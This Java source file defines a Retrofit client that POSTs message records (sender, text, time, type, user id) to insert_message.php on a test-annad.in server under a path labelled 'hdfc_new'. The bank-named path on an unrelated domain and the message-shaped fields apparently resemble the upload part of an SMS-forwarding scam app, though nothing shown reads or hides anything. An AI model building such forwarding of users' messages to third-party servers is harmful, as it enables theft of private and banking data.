package com.example.second;

import retrofit2.Call;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Body;
import retrofit2.http.POST;


interface ApiService {
    @POST("insert_message.php")
    Call<Void> sendmessage(@Body Message message);
}


class ApiClient {
    private static final String BASE_URL = "https://test-annad.in/annad/hdfc_new/";
    private static Retrofit retrofit;

    public static Retrofit getClient() {
        if (retrofit == null) {
            retrofit = new Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
        }
        return retrofit;
    }
}


class  Message{

    String sender;
    String msg;
    String time;
    String type;

    String userid;

    Message(String sender,String msg,String time,String type,String userid){
        this.sender = sender;
        this.msg = msg;
        this.time = time;
        this.type = type;
        this.userid = userid;
    }
}